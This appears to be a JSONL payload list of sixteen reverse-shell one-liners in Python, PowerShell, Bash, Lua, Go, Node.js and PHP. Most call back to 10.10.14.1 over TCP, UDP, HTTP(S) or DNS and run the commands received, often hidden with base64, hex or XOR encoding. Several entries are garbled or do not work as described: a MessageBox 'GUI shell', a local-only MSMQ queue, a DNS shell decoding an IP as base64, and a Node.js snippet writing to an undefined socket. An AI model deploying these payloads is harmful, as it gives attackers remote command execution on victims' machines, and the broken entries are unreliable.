{"id":"rshell-285","language":"python","payload":"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'","description":"Python TCP reverse shell with URL-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","urlencode"]}
{"id":"rshell-286","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new([System.Web.HttpUtility]::UrlEncode($o));[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)","description":"PowerShell MSMQ reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["msmq","powershell","obfuscated","urlencode"]}
{"id":"rshell-287","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","hex"]}
{"id":"rshell-288","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell GUI reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["gui","powershell","obfuscated","base64"]}
{"id":"rshell-289","language":"lua","payload":"lua -e 'local s=require(\"socket\").tcp();s:connect(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(o);end'","description":"Lua TCP reverse shell with standard output.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","lua"]}
{"id":"rshell-290","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'),[Func[byte,byte]]{param($b);$b -bxor 0x3C})));iex $x","description":"Obfuscated PowerShell TCP reverse shell using XOR encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-291","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"encoding/hex\");func main(){c,_:=net.Dial(\"tcp\",\"10.10.14.1:4444\");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(\"bash\",\"-c\",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}","description":"Go TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","go","obfuscated","hex"]}
{"id":"rshell-292","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($wc.DownloadString('https://10.10.14.1:8443/cmd')));$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('https://10.10.14.1:8443/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell HTTPS reverse shell with Base64-encoded input/output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","base64"]}
{"id":"rshell-293","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))","description":"Node.js TCP reverse shell with compressed Base64 input/output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","nodejs","obfuscated","base64","compressed"]}
{"id":"rshell-294","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["udp","powershell","obfuscated","base64"]}
{"id":"rshell-295","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'","description":"Bash UDP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","bash","obfuscated","base64"]}
{"id":"rshell-296","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([byte[]]$b[0..($i-1)],[Func[byte,byte]]{param($b);$b -bxor 0x3C})));$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with XOR-encoded input.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-297","language":"python","payload":"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'","description":"Python TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","hex"]}
{"id":"rshell-298","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))}","description":"PowerShell HTTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["http","powershell","obfuscated","base64"]}
{"id":"rshell-299","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'","description":"PHP TCP reverse shell with URL-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","urlencode"]}
{"id":"rshell-300","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($d.AddressList[0].IPAddressToString));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with Base64-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","base64"]}